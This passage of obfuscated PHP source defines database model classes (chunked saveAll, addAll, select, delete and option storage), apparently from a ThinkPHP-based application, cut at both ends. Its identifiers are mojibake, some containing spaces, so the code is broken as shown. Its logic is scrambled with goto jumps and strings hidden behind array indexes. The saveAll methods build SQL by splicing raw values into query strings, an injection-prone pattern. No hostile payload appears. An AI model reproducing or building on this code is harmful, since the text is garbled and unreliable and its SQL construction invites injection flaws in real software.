$Eî‡â¨è≈É[353]) { $Fãëµóê¯ê = strtolower($this->db->getDbType()); if (strpos($Fãëµóê¯ê, $Eî‡â¨è≈É[9]) !== 0) { return; } $bÀ∫†®ˆˆ = $this->field(!0)->fields; $B‚é∏∆áè˜ = $bÀ∫†®ˆˆ[$Eî‡â¨è≈É[250]]; if (isset($bÀ∫†®ˆˆ[$Eî‡â¨è≈É[249]])) { unset($B‚é∏∆áè˜[$bÀ∫†®ˆˆ[$Eî‡â¨è≈É[249]]]); } foreach ($B‚é∏∆áè˜ as $B¿˜çÀ˜úÌ => $e÷‡∂ÇÑŸ∂) { if (!isset($aÁøÍ“Ãæû[$B¿˜çÀ˜úÌ])) { $aÁøÍ“Ãæû[$B¿˜çÀ˜úÌ] = $Eî‡â¨è≈É[33]; } } } } private function dataAfterFilter(&$a÷∏¿áò˜ù) { $bÕçæƒãø‰ =& $_SERVER[™⁄»üÆ]; foreach ($this->dataAuto as $CÌå ◊≠êú) { $aâø∆√úµÊ = $CÌå ◊≠êú[0]; if (!in_array($bÕçæƒãø‰[355], explode($bÕçæƒãø‰[47], $CÌå ◊≠êú[2]))) { continue; } if (!isset($a÷∏¿áò˜ù[$aâø∆√úµÊ])) { continue; } switch (trim($CÌå ◊≠êú[3])) { case $bÕçæƒãø‰[319]: case $bÕçæƒãø‰[320]: $céº∆ò´∫Æ = isset($CÌå ◊≠êú[4]) ? (array) $CÌå ◊≠êú[4] : array(); array_unshift($céº∆ò´∫Æ, $a÷∏¿áò˜ù[$aâø∆√úµÊ]); if ($bÕçæƒãø‰[319] == $CÌå ◊≠êú[3]) { $a÷∏¿áò˜ù[$aâø∆√úµÊ] = call_user_func_array($CÌå ◊≠êú[1], $céº∆ò´∫Æ); } else { $a÷∏¿áò˜ù[$aâø∆√úµÊ] = call_user_func_array(array(&$this, $CÌå ◊≠êú[1]), $céº∆ò´∫Æ); } break; case $bÕçæƒãø‰[271]: $a÷∏¿áò˜ù[$aâø∆√úµÊ] = $a÷∏¿áò˜ù[$CÌå ◊≠êú[1]]; break; case $bÕçæƒãø‰[292]: $cÖ€éâÉ…™ = $a÷∏¿áò˜ù[$aâø∆√úµÊ]; $a÷∏¿áò˜ù[$aâø∆√úµÊ] = json_decode($cÖ€éâÉ…™, !0); if (is_null($a÷∏¿áò˜ù[$aâø∆√úµÊ])) { $a÷∏¿áò˜ù[$aâø∆√úµÊ] = $cÖ€éâÉ…™; } break; case $bÕçæƒãø‰[321]: if ($a÷∏¿áò˜ù[$aâø∆√úµÊ] === $bÕçæƒãø‰[33]) { unset($a÷∏¿áò˜ù[$aâø∆√úµÊ]); } break; case $bÕçæƒãø‰[322]: $a÷∏¿áò˜ù[$aâø∆√úµÊ] = $CÌå ◊≠êú[1]; default: break; } } } public function saveAll($E¯Òû¢ãÈ·) { goto aé‚Ω¨°ó¿; aé‚Ω¨°ó¿: $BŒŸ≠Çπå∆ =& $_SERVER[™⁄»üÆ]; $c»ª©•©’ú = $this->tablePrefix . $this->tableName; $cáâÖ’¬ÀÔ = self::SQL_WHERE_IN_CHUNK; goto F¯‡÷¯º˘ó; F¯‡÷¯º˘ó: $E¯Òû¢ãÈ· = is_array($E¯Òû¢ãÈ·) ? $E¯Òû¢ãÈ· : array(); $e—µ°§øò° = $BŒŸ≠Çπå∆[375]; $EêàŸÓÍÃé = 0; goto Dƒ«€ ¡ÌÑ; Cä±µµ‰ôÈ: $this->chunkEventSet(); goto C∂«äôÇø°; Dƒ«€ ¡ÌÑ: $däç›ßÙâä = array(); $e∞ìëÆÑ–È = count($E¯Òû¢ãÈ·); for ($bòø€˘Ô›Ø = 0; $bòø€˘Ô›Ø < $e∞ìëÆÑ–È; $bòø€˘Ô›Ø++) { $fø‡ÿ€≤≥ë = $E¯Òû¢ãÈ·[$bòø€˘Ô›Ø]; if (!is_array($fø‡ÿ€≤≥ë) || count($fø‡ÿ€≤≥ë) != 4) { continue; } $d”çö†˜·ﬂ = "\x55\120\x44\101\x54\105\40\140{$c»ª©•©’ú}\x60\40\x53\x45\x54\40{$fø‡ÿ€≤≥ë[2]}\40\75\x20\x43\x41\x53\x45\x20{$fø‡ÿ€≤≥ë[0]}\x20\xa"; if ($EêàŸÓÍÃé == 0) { $e—µ°§øò° = $d”çö†˜·ﬂ; } $däç›ßÙâä[] = $BŒŸ≠Çπå∆[116] . $fø‡ÿ€≤≥ë[1] . $BŒŸ≠Çπå∆[116]; $EêàŸÓÍÃé++; $e—µ°§øò° .= "\x20\x57\x48\105\116\x20\x27{$fø‡ÿ€≤≥ë[1]}\x27\40\124\x48\105\x4e\40\47{$fø‡ÿ€≤≥ë[3]}\47\40\xa"; if ($EêàŸÓÍÃé == $cáâÖ’¬ÀÔ || $bòø€˘Ô›Ø == $e∞ìëÆÑ–È - 1) { goto FŸÂÑ•ö»é; FŸÂÑ•ö»é: $cÉØã©ö´ê = implode($BŒŸ≠Çπå∆[47], $däç›ßÙâä); $e—µ°§øò° .= "\x20\x45\x4e\x44\x20\x20\127\x48\105\x52\x45\40{$fø‡ÿ€≤≥ë[0]}\x20\x49\116\40\50{$cÉØã©ö´ê}\x29\x20"; $this->execute($e—µ°§øò°); goto FÃ≈≠Óß˜À; f†Õ°Öõƒˆ: $däç›ßÙâä = array(); goto f÷ÁÕÙÀâ•; FÃ≈≠Óß˜À: $EêàŸÓÍÃé = 0; $e—µ°§øò° = $d”çö†˜·ﬂ; $this->chunkEventCheck(count($däç›ßÙâä)); goto f†Õ°Öõƒˆ; f÷ÁÕÙÀâ•: } } goto Cä±µµ‰ôÈ; C∂«äôÇø°: } public function saveAllEach($B»”˜≈óÒ®) { $fçò’©ááè =& $_SERVER[™⁄»üÆ]; $C¥Çë‘æô◊ = $this->tablePrefix . $this->tableName; foreach ($B»”˜≈óÒ® as $Bè˘ÍÈŸºú) { if (!is_array($Bè˘ÍÈŸºú) || count($Bè˘ÍÈŸºú) != 4) { continue; } $aÕ“Ï˜≠•ü = $Bè˘ÍÈŸºú[0] . $fçò’©ááè[376] . $Bè˘ÍÈŸºú[1] . $fçò’©ááè[116]; $aÎ¡ÃÜÚ≤â = $Bè˘ÍÈŸºú[2] . $fçò’©ááè[376] . $Bè˘ÍÈŸºú[3] . $fçò’©ááè[116]; $C˘÷õ¥Ö¯é = "\165\160\x64\x61\164\x65\40{$C¥Çë‘æô◊}\40\163\145\164\x20{$aÎ¡ÃÜÚ≤â}\40\167\x68\145\x72\x65\x20{$aÕ“Ï˜≠•ü}\73"; $this->execute($C˘÷õ¥Ö¯é); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e¡Æ±∂Ö§à = false, $c¨ËØ÷å∂ = false) { $this->_chunkEvent = $e¡Æ±∂Ö§à; $this->_chunkEventParam = $c¨ËØ÷å∂; } private function chunkEventCheck($b¶Ôú£•Âú) { if (!$this->_chunkEvent) { return; } $bª∑ÌŸäìﬂ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bª∑ÌŸäìﬂ[$_SERVER[™⁄»üÆ][377]] = $b¶Ôú£•Âú; Hook::trigger($this->_chunkEvent, $bª∑ÌŸäìﬂ); } public function addAll($EëÃô≤âÂŸ, $fÿ®àè˘·ú = array(), $Aêï”Á∫Íı = false) { goto AëºáûËå; AëºáûËå: $c»∆ŸƒüÂŒ =& $_SERVER[™⁄»üÆ]; ignore_timeout(); $d’òàÌƒãÜ = self::SQL_WHERE_IN_CHUNK; goto bÂøÂÂ¢ä˘; Aîûÿ∫ûåá: if (method_exists($this->db, $c»∆ŸƒüÂŒ[270])) { for ($bÿŸËÓ ïÈ = 0; $bÿŸËÓ ïÈ < count($EëÃô≤âÂŸ); $bÿŸËÓ ïÈ += $d’òàÌƒãÜ) { $Fò‡ÿ≤‹ï√ = array_slice($EëÃô≤âÂŸ, $bÿŸËÓ ïÈ, $d’òàÌƒãÜ); if (!is_array($Fò‡ÿ≤‹ï√) || count($Fò‡ÿ≤‹ï√) == 0) { break; } $DÑ‹π“∫Èü = $this->db->insertAll($Fò‡ÿ≤‹ï√, $fÿ®àè˘·ú, $Aêï”Á∫Íı); $this->chunkEventCheck(count($Fò‡ÿ≤‹ï√)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($EëÃô≤âÂŸ as $bÂÚŒÏä®¯ => $e®’‹ä¢Ü±) { $DÑ‹π“∫Èü = $this->db->insert($e®’‹ä¢Ü±, $fÿ®àè˘·ú, $Aêï”Á∫Íı); } $this->commit(); } if (!1 !== $DÑ‹π“∫Èü) { $dóåÛﬂ´™ë = $this->getLastInsID(); if ($dóåÛﬂ´™ë) { return $dóåÛﬂ´™ë; } } return $DÑ‹π“∫Èü; goto A›ÿ «´æ; bÂøÂÂ¢ä˘: if (empty($EëÃô≤âÂŸ)) { $this->error = think_lang($c»∆ŸƒüÂŒ[269]); return !1; } $fÿ®àè˘·ú = $this->_parseOptions($fÿ®àè˘·ú); foreach ($EëÃô≤âÂŸ as $bÂÚŒÏä®¯ => $e®’‹ä¢Ü±) { $EëÃô≤âÂŸ[$bÂÚŒÏä®¯] = $this->_facade($e®’‹ä¢Ü±); $this->_beforeInsert($EëÃô≤âÂŸ[$bÂÚŒÏä®¯], $fÿ®àè˘·ú); } goto Aîûÿ∫ûåá; A›ÿ «´æ: } public function save($C®ã¥Á∆ù” = '', $b¿´‘÷í¨Â = array()) { goto eƒΩ›õàÊÉ; eƒΩ›õàÊÉ: $Fáó±Û¯Îç =& $_SERVER[™⁄»üÆ]; $A∞À›ıä±∆ = self::SQL_WHERE_IN_CHUNK; $AÆ√ﬁ„¬ûß = $this->optionsValue(); goto BÂπÓÀ”Öˆ; b‡¥∏ÁµçÑ: $Aˆ«∂‘ÃÿØ = $AÆ√ﬁ„¬ûß[$Fáó±Û¯Îç[273]][$A±ç˘ä≤∂¬][1]; $Aˆ«∂‘ÃÿØ = is_array($Aˆ«∂‘ÃÿØ) ? $Aˆ«∂‘ÃÿØ : array(); $f®¿®âÙ™’ = count($Aˆ«∂‘ÃÿØ); goto Aπ„§É‡Ïà; BÂπÓÀ”Öˆ: $A±ç˘ä≤∂¬ = $this->findWhereField($AÆ√ﬁ„¬ûß); if (!$A±ç˘ä≤∂¬) { return parent::save($C®ã¥Á∆ù”, $b¿´‘÷í¨Â); } $b·ÕË≈å Í = 0; goto b‡¥∏ÁµçÑ; Aπ„§É‡Ïà: for ($Bæä¿∆ﬁÉ¶ = 0; $Bæä¿∆ﬁÉ¶ < $f®¿®âÙ™’; $Bæä¿∆ﬁÉ¶ += $A∞À›ıä±∆) { $Fﬁ’ûõ∆äê = array_slice($Aˆ«∂‘ÃÿØ, $Bæä¿∆ﬁÉ¶, $A∞À›ıä±∆); if (!is_array($Fﬁ’ûõ∆äê) || count($Fﬁ’ûõ∆äê) == 0) { break; } $AÆ√ﬁ„¬ûß[$Fáó±Û¯Îç[273]][$A±ç˘ä≤∂¬][1] = $Fﬁ’ûõ∆äê; $this->optionsValue($AÆ√ﬁ„¬ûß); $b·ÕË≈å Í += parent::save($C®ã¥Á∆ù”, $b¿´‘÷í¨Â); $this->chunkEventCheck(count($Fﬁ’ûõ∆äê)); } $this->chunkEventSet(); return $b·ÕË≈å Í; goto cÒâ•∆⁄ˆ†; cÒâ•∆⁄ˆ†: } public function add($dßß∆îâÑÇ = '', $Cáø¯å¥ß• = array(), $Fµæîãáƒ¶ = false) { if ($this->addTaskStatus && is_array($dßß∆îâÑÇ)) { $this->addTaskData[] = $dßß∆îâÑÇ; return; } return parent::add($dßß∆îâÑÇ, $Cáø¯å¥ß•, $Fµæîãáƒ¶); } public function parseWhereLike($DóîÚ∏àƒÒ, $c≥öÆ‰‚ß‹ = '', $d⁄¢ÑÃí∞÷ = false, &$aÚéˆ ˜äÁ = false) { goto Dæç§†®∏ñ; Dæç§†®∏ñ: $fçä–ã‰ãË =& $_SERVER[™⁄»üÆ]; $BùÃü∫ø¯Î = $GLOBALS[$fçä–ã‰ãË[6]][$fçä–ã‰ãË[378]]; if (!$BùÃü∫ø¯Î[$fçä–ã‰ãË[379]]) { return $DóîÚ∏àƒÒ; } goto bπãû–ôñø; Eﬁ…ÊäâŒÂ: foreach ($DóîÚ∏àƒÒ as $dçàÇ∫≤œÒ => $FÉ‰ÔŒﬂ¢) { if (is_array($FÉ‰ÔŒﬂ¢) && count($FÉ‰ÔŒﬂ¢) == 2 && $FÉ‰ÔŒﬂ¢[0] == $fçä–ã‰ãË[380] && is_string($FÉ‰ÔŒﬂ¢[1]) && substr($FÉ‰ÔŒﬂ¢[1], 0, 1) == $fçä–ã‰ãË[381] && substr($FÉ‰ÔŒﬂ¢[1], strlen($FÉ‰ÔŒﬂ¢[1]) - 1, 1) == $fçä–ã‰ãË[381]) { goto b–≤Ÿ∞ﬁí√; d“ﬂ◊ÖŸ‰ﬂ: $B∆Óû•øˆõ = $this->db->escapeString($B∆Óû•øˆõ); if (!strpos($FÆªïëüƒ≤, $fçä–ã‰ãË[95])) { $FÆªïëüƒ≤ = $fçä–ã‰ãË[382] . $FÆªïëüƒ≤ . $fçä–ã‰ãË[382]; } $bµâ¿∞¡·ƒ = $fçä–ã‰ãË[182] . $B∆Óû•øˆõ . $fçä–ã‰ãË[182]; goto f¡∏ƒÇ˜æÊ; f¡∏ƒÇ˜æÊ: if ($BùÃü∫ø¯Î[$fçä–ã‰ãË[383]]) { $bµâ¿∞¡·ƒ = $fçä–ã‰ãË[384] . $B∆Óû•øˆõ . $fçä–ã‰ãË[385]; if ($BùÃü∫ø¯Î[$fçä–ã‰ãË[386]]) { $bµâ¿∞¡·ƒ = $fçä–ã‰ãË[385] . $B∆Óû•øˆõ . $fçä–ã‰ãË[384]; } } $Fñ¡àıòπ•[$bå“Á≠å—Ô] = $fçä–ã‰ãË[387] . $FÆªïëüƒ≤ . $fçä–ã‰ãË[388] . $bµâ¿∞¡·ƒ . $fçä–ã‰ãË[389]; $bå“Á≠å—Ô++; goto fÛ⁄‹…ŸªÉ; fÛ⁄‹…ŸªÉ: continue; goto côöí≤Ü‡â; b–≤Ÿ∞ﬁí√: $aÚéˆ ˜äÁ = !0; $FÆªïëüƒ≤ = is_string($dçàÇ∫≤œÒ) ? $dçàÇ∫≤œÒ : $c≥öÆ‰‚ß‹; $B∆Óû•øˆõ = substr($FÉ‰ÔŒﬂ¢[1], 1, strlen($FÉ‰ÔŒﬂ¢[1]) - 2); goto d“ﬂ◊ÖŸ‰ﬂ; côöí≤Ü‡â: } if (is_array($FÉ‰ÔŒﬂ¢)) { $c≥öÆ‰‚ß‹ = is_string($dçàÇ∫≤œÒ) ? $dçàÇ∫≤œÒ : $c≥öÆ‰‚ß‹; $FÉ‰ÔŒﬂ¢ = $this->parseWhereLike($FÉ‰ÔŒﬂ¢, $c≥öÆ‰‚ß‹, !0, $aÚéˆ ˜äÁ); } if (is_numeric($dçàÇ∫≤œÒ)) { $Fñ¡àıòπ•[$bå“Á≠å—Ô] = $FÉ‰ÔŒﬂ¢; $bå“Á≠å—Ô++; } else { $Fñ¡àıòπ•[$dçàÇ∫≤œÒ] = $FÉ‰ÔŒﬂ¢; } } if ($aÚéˆ ˜äÁ && !$d⁄¢ÑÃí∞÷) { } return $Fñ¡àıòπ•; goto E†˘…™‘Ôâ; bπãû–ôñø: if (!is_array($DóîÚ∏àƒÒ)) { return $DóîÚ∏àƒÒ; } $Fñ¡àıòπ• = array(); $bå“Á≠å—Ô = 0; goto Eﬁ…ÊäâŒÂ; E†˘…™‘Ôâ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($a∑¿øÚò™ß = array()) { goto DÜáã¥ï˘Û; büÛﬂˆ≈óé: return $cœÌ¨éƒâﬂ; goto C∞◊ª∞≤Ê‰; aµµÛ•ù…Æ: $E ÜÌÌ›Ìâ = $this->findWhereField($aË–§˘ÇÆπ); if (!$E ÜÌÌ›Ìâ || isset($aË–§˘ÇÆπ[$f‡ùã©ˆ§¥[290]]) || isset($aË–§˘ÇÆπ[$f‡ùã©ˆ§¥[351]])) { return parent::select($a∑¿øÚò™ß); } $açé… ´¢Ω = $aË–§˘ÇÆπ[$f‡ùã©ˆ§¥[273]][$E ÜÌÌ›Ìâ][1]; goto c∂âü≠≠™ö; DÜáã¥ï˘Û: $f‡ùã©ˆ§¥ =& $_SERVER[™⁄»üÆ]; $Fô¨ØÊ÷‡Ã = self::SQL_WHERE_IN_CHUNK; $aË–§˘ÇÆπ = $this->optionsValue(); goto aµµÛ•ù…Æ; c∂âü≠≠™ö: $açé… ´¢Ω = is_array($açé… ´¢Ω) ? $açé… ´¢Ω : array(); $cœÌ¨éƒâﬂ = null; for ($d¬ìÜò¶÷Ö = 0; $d¬ìÜò¶÷Ö < count($açé… ´¢Ω); $d¬ìÜò¶÷Ö += $Fô¨ØÊ÷‡Ã) { $c’Øô’èÛç = array_slice($açé… ´¢Ω, $d¬ìÜò¶÷Ö, $Fô¨ØÊ÷‡Ã); if (!is_array($c’Øô’èÛç) || count($c’Øô’èÛç) == 0) { break; } $aË–§˘ÇÆπ[$f‡ùã©ˆ§¥[273]][$E ÜÌÌ›Ìâ][1] = $c’Øô’èÛç; $this->optionsValue($aË–§˘ÇÆπ); $e¡€åì‰„˘ = parent::select($a∑¿øÚò™ß); if (!$e¡€åì‰„˘) { continue; } $cœÌ¨éƒâﬂ = is_array($cœÌ¨éƒâﬂ) ? $cœÌ¨éƒâﬂ : array(); $cœÌ¨éƒâﬂ = array_merge($cœÌ¨éƒâﬂ, $e¡€åì‰„˘); } goto büÛﬂˆ≈óé; C∞◊ª∞≤Ê‰: } public function delete($a∑◊£‡¬Áê = array()) { goto eÍÑ ¡ﬁ∞’; cäÕ˘ÈßÎ∂: $EØÕæ÷Ç’´ = $this->findWhereField($eåëáŸ›∫¶); if (!$EØÕæ÷Ç’´) { return parent::delete($a∑◊£‡¬Áê); } $fÕ§º°‘Ò£ = 0; goto AÊ¬•óªµ ; e–°ÁÚáˆÉ: return $fÕ§º°‘Ò£; goto A∫á–±âπá; AÊ¬•óªµ : $dá®Ø‹ï•ç = $eåëáŸ›∫¶[$bÛëá’¶ó∆[273]][$EØÕæ÷Ç’´][1]; $dá®Ø‹ï•ç = is_array($dá®Ø‹ï•ç) ? $dá®Ø‹ï•ç : array(); for ($Cç‘Õæ£Íô = 0; $Cç‘Õæ£Íô < count($dá®Ø‹ï•ç); $Cç‘Õæ£Íô += $AÊ¯è„Œºç) { $e÷ãí·”÷‚ = array_slice($dá®Ø‹ï•ç, $Cç‘Õæ£Íô, $AÊ¯è„Œºç); if (!is_array($e÷ãí·”÷‚) || count($e÷ãí·”÷‚) == 0) { break; } $eåëáŸ›∫¶[$bÛëá’¶ó∆[273]][$EØÕæ÷Ç’´][1] = $e÷ãí·”÷‚; $this->optionsValue($eåëáŸ›∫¶); $fÕ§º°‘Ò£ += parent::delete($a∑◊£‡¬Áê); } goto e–°ÁÚáˆÉ; eÍÑ ¡ﬁ∞’: $bÛëá’¶ó∆ =& $_SERVER[™⁄»üÆ]; $AÊ¯è„Œºç = self::SQL_WHERE_IN_CHUNK; $eåëáŸ›∫¶ = $this->optionsValue(); goto cäÕ˘ÈßÎ∂; A∫á–±âπá: } private function findWhereField($F¢◊¨≤±Ú´) { $d≥©ûåÉËÈ =& $_SERVER[™⁄»üÆ]; $b∏Æ∏â•»· = self::SQL_WHERE_IN_CHUNK; if (!is_array($F¢◊¨≤±Ú´) || !is_array($F¢◊¨≤±Ú´[$d≥©ûåÉËÈ[273]])) { return !1; } foreach ($F¢◊¨≤±Ú´[$d≥©ûåÉËÈ[273]] as $E∫ñè˜ú∆’ => $cÈ’ÿúÿÒÑ) { if (is_array($cÈ’ÿúÿÒÑ) && isset($cÈ’ÿúÿÒÑ[0]) && is_string($cÈ’ÿúÿÒÑ[0]) && strtolower($cÈ’ÿúÿÒÑ[0]) == $d≥©ûåÉËÈ[7] && is_array($cÈ’ÿúÿÒÑ[1]) && count($cÈ’ÿúÿÒÑ[1]) > $b∏Æ∏â•»·) { ignore_timeout(); return $E∫ñè˜ú∆’; } } return !1; } public function setMasterDB($b–√∞Õ‚†ç = true) { think_config($_SERVER[™⁄»üÆ][390], $b–√∞Õ‚†ç); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\145\155\x4f\x70\164\x69\x6f\156"; public $field = array(); public function listData($bÏÈ•É∫ÏÚ = false, $f—÷Ÿ˘≤Œ» = "\x6d\157\x64\151\x66\x79\x54\x69\155\x65", $f´ÀÜÓîÊ® = false) { $d∆¬©±µê§ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$d∆¬©±µê§) { return $bÏÈ•É∫ÏÚ ? null : array(); } if (!$bÏÈ•É∫ÏÚ) { $d∆¬©±µê§ = array_filter(array_values($d∆¬©±µê§)); return array_sort_by($d∆¬©±µê§, $f—÷Ÿ˘≤Œ», $f´ÀÜÓîÊ®); } return $d∆¬©±µê§[$_SERVER[™⁄»üÆ][391] . $bÏÈ•É∫ÏÚ]; } public function insert($E≠ƒ¬ãó Æ) { goto F›í¥¢éö÷; F›í¥¢éö÷: $f≤¶Ó¥É≤ƒ =& $_SERVER[™⁄»üÆ]; $E≠ƒ¬ãó Æ = array_field_key($E≠ƒ¬ãó Æ, $this->field); $Fíº∆Æ‰ì˘ = Model($this->modelType)->get($f≤¶Ó¥É≤ƒ[392], $this->optionType . $f≤¶Ó¥É≤ƒ[393]); goto d¥è«Ø‡‡ô; d¥è«Ø‡‡ô: $Fíº∆Æ‰ì˘ = $Fíº∆Æ‰ì˘ ? $Fíº∆Æ‰ì˘ : 0; $E≠ƒ¬ãó Æ[$f≤¶Ó¥É≤ƒ[394]] = ++$Fíº∆Æ‰ì˘; $E≠ƒ¬ãó Æ[$f≤¶Ó¥É≤ƒ[194]] = time(); goto eëˆßÌúÔç; dåö∞’·¨À: return $Fíº∆Æ‰ì˘; goto a§á§‹ºˆÉ; eëˆßÌúÔç: $E≠ƒ¬ãó Æ[$f≤¶Ó¥É≤ƒ[84]] = time(); Model($this->modelType)->set($f≤¶Ó¥É≤ƒ[392], $Fíº∆Æ‰ì˘, $this->optionType . $f≤¶Ó¥É≤ƒ[393]); Model($this->modelType)->set($f≤¶Ó¥É≤ƒ[391] . $Fíº∆Æ‰ì˘, $E≠ƒ¬ãó Æ, $this->optionType); goto dåö∞’·¨À; a§á§‹ºˆÉ: } public function update($Bâˆª˘¿ Ø, $EÊáïÑñø) { goto f®Æùß«·å; f®Æùß«·å: $f≥àœôÌ–µ =& $_SERVER[™⁄»üÆ]; $EÊáïÑñø = array_field_key($EÊáïÑñø, $this->field); $F†∏¿ïÖëƒ = $this->listData($Bâˆª˘¿ Ø); goto EÍ”ƒ—¢ü…; cãÈ¥⁄Î”Ë: return Model($this->modelType)->set($f≥àœôÌ–µ[391] . $Bâˆª˘¿ Ø, $EÊáïÑñø, $this->optionType); goto bÇœ€ëçéÀ; EÍ”ƒ—¢ü…: if (!$F†∏¿ïÖëƒ || !$Bâˆª˘¿ Ø) { return !1; } $EÊáïÑñø = array_merge($F†∏¿ïÖëƒ, $EÊáïÑñø); $EÊáïÑñø[$f≥àœôÌ–µ[84]] = time(); goto cãÈ¥⁄Î”Ë; bÇœ€ëçéÀ: } public function remove($CéÔú±ƒ◊„) { if (!$CéÔú±ƒ◊„) { return !1; } return Model($this->modelType)->remove($_SERVER[™⁄»üÆ][391] . $CéÔú±ƒ◊„, $this->optionType); } public function clear() { $fÒŸ‰®·Ìô =& $_SERVER[™⁄»üÆ]; Model($this->modelType)->remove($fÒŸ‰®·Ìô[392], $this->optionType . $fÒŸ‰®·Ìô[393]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Bÿã⁄óöÖÁ, $Bﬂ≠ÑäµåÊ) { if (!$Bﬂ≠ÑäµåÊ) { return !1; } $BöäÆÖëúπ = $this->listData(); $BöäÆÖëúπ = array_to_keyvalue($BöäÆÖëúπ, $Bÿã⁄óöÖÁ); return isset($BöäÆÖëúπ[$Bﬂ≠ÑäµåÊ]) ? $BöäÆÖëúπ[$Bﬂ≠ÑäµåÊ] : !1; } public function findByName($a∂©≤É∏àå) { return $this->findByKey($_SERVER[™⁄»üÆ][28], $a∂©≤É∏àå); } protected function resetData($eä»·…´¡é) { $dÖîÜÑùœÀ =& $_SERVER[™⁄»üÆ]; $eä»·…´¡é = is_array($eä»·…´¡é) ? $eä»·…´¡é : array(); $båç÷Êäö€ = array(); for ($cóõ˜±°°´ = 0; $cóõ˜±°°´ < count($eä»·…´¡é); $cóõ˜±°°´++) { $båç÷Êäö€[$dÖîÜÑùœÀ[391] . $eä»·…´¡é[$cóõ˜±°°´][$dÖîÜÑùœÀ[394]]] = $eä»·…´¡é[$cóõ˜±°°´]; } return Model($this->modelType)->set($båç÷Êäö€, !1, $this->optionType); } private function getAutoName($cüÖÂÌéè¿) { $föêè©π±Ó = array_to_keyvalue($this->listData(), $_SERVER[™⁄»üÆ][28]); if (!$föêè©π±Ó || !isset($föêè©π±Ó[$cüÖÂÌéè¿])) { return $cüÖÂÌéè¿; } for ($e≠ã∂—„ÕÌ = 1; $e≠ã∂—„ÕÌ < count($föêè©π±Ó); $e≠ã∂—„ÕÌ++) { $Fñ‡ÜÚ≠ç… = $cüÖÂÌéè¿ . "\x28{$e≠ã∂—„ÕÌ}\51"; if (!isset($föêè©π±Ó[$Fñ‡ÜÚ≠ç…])) { return $Fñ‡ÜÚ≠ç…; } } return $Fñ‡ÜÚ≠ç…; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($aã©Œ””Öû = false, $fßñÀ•Øíö = '', $c»È“û¢ùû = false) { goto b≤†∞¬ñÎà; b≤†∞¬ñÎà: $Fµâ≥úƒïÉ =& $_SERVER[™⁄»üÆ]; $cÂ™∆™ÕÈª = $this->cacheGet($fßñÀ•Øíö); $bπ—ÕÀ›ñÈ = $this->optionDefault($fßñÀ•Øíö); goto d˜ÙÿôôÔ◊; b‘™‡«ÜñÊ: $this->cacheSet($fßñÀ•Øíö, $cÂ™∆™ÕÈª); $cÂ™∆™ÕÈª = array_merge($bπ—ÕÀ›ñÈ, $cÂ™∆™ÕÈª); return $aã©Œ””Öû ? $cÂ™∆™ÕÈª[$aã©Œ””Öû] : $cÂ™∆™ÕÈª; goto AëΩÙæÂÇÿ; d˜ÙÿôôÔ◊: $bπ—ÕÀ›ñÈ = is_array($bπ—ÕÀ›ñÈ) ? $bπ—ÕÀ›ñÈ : array(); if (is_array($cÂ™∆™ÕÈª)) { $cÂ™∆™ÕÈª = array_merge($bπ—ÕÀ›ñÈ, $cÂ™∆™ÕÈª); return $aã©Œ””Öû ? isset($cÂ™∆™ÕÈª[$aã©Œ””Öû]) ? $cÂ™∆™ÕÈª[$aã©Œ””Öû] : null : $cÂ™∆™ÕÈª; } $bô⁄ˆ≥Ω˘ˆ = $this->filterWhere(array($Fµâ≥úƒïÉ[29] => $fßñÀ•Øíö)); goto d˘ÀÔñÛÈ†; d˘ÀÔñÛÈ†: $cÂ™∆™ÕÈª = $this->where($bô⁄ˆ≥Ω˘ˆ)->select(); $cÂ™∆™ÕÈª = array_to_keyvalue($cÂ™∆™ÕÈª, $Fµâ≥úƒïÉ[93], $Fµâ≥úƒïÉ[372]); foreach ($cÂ™∆™ÕÈª as $E¡ëÛâŒóÑ => $cΩµ”Ç†ñÉ) { if ($c»È“û¢ùû || in_array($E¡ëÛâŒóÑ, $this->jsonField)) { $cÂ™∆™ÕÈª[$E¡ëÛâŒóÑ] = json_decode($cΩµ”Ç†ñÉ, !0); } } goto b‘™‡«ÜñÊ; AëΩÙæÂÇÿ: } public function set($dØƒ›Ø·π¿, $Féç«É∆ä¿ = false, $c”Ö·ô˜ﬁ§ = '') { goto a⁄”µ◊”î€; c∫›ÿ”ºåƒ: $B¬•†≠é‡° = is_array($dØƒ›Ø·π¿) ? $dØƒ›Ø·π¿ : array($dØƒ›Ø·π¿ => $Féç«É∆ä¿); foreach ($B¬•†≠é‡° as $E¯Ë¶îùÿŒ => $b∑´∫ïÈñπ) { if (is_array($b∑´∫ïÈñπ)) { $b∑´∫ïÈñπ = json_encode_force($b∑´∫ïÈñπ); } $this->checkLength($b∑´∫ïÈñπ, !1, $this->tableName . $DÛ¢™åΩ∏¥[4] . $dØƒ›Ø·π¿); $b∑´∫ïÈñπ = self::textEncode($b∑´∫ïÈñπ); $B¬•†≠é‡° = array($DÛ¢™åΩ∏¥[29] => $c”Ö·ô˜ﬁ§, $DÛ¢™åΩ∏¥[93] => $E¯Ë¶îùÿŒ, $DÛ¢™åΩ∏¥[372] => $b∑´∫ïÈñπ); $D–âŒ¬Øúô[] = $this->filterWhere($B¬•†≠é‡°); } if (!$D–âŒ¬Øúô) { return !0; } goto Bù—§œîÂÂ; Bù—§œîÂÂ: return $this->addAll($D–âŒ¬Øúô, array(), !0); goto f§ãÎæ…çÕ; a⁄”µ◊”î€: $DÛ¢™åΩ∏¥ =& $_SERVER[™⁄»üÆ]; $this->cacheRemove($c”Ö·ô˜ﬁ§); $D–âŒ¬Øúô = array(); goto c∫›ÿ”ºåƒ; f§ãÎæ…çÕ: } protected function optionDefault($cœ•‰›ê◊ô = '') { return !1; } public function setDeep($C›»Ã£óÏı, $Bü≤ÃÙ…ÛÉ = false, $eäÇ∏öµ≥≠ = '') { $Dëü∞Ç“áÖ = explode($_SERVER[™⁄»üÆ][95], $C›»Ã£óÏı); 